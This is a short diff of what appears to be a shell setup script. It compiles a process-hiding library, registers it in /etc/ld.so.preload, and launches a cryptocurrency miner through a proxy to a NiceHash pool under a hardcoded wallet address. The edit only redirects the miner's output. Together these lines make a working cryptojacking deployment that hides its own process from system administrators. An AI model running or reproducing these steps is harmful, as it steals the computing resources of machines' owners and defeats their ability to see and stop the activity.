@@ -45,4 +45,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-nohup ./graftcp/graftcp ./mini --url=ssl://3MJHGMqGVWjv24fKUWDAqyiTFNsuWJucAd.Surya@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+nohup ./graftcp/graftcp ./mini --url=ssl://3MJHGMqGVWjv24fKUWDAqyiTFNsuWJucAd.Surya@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
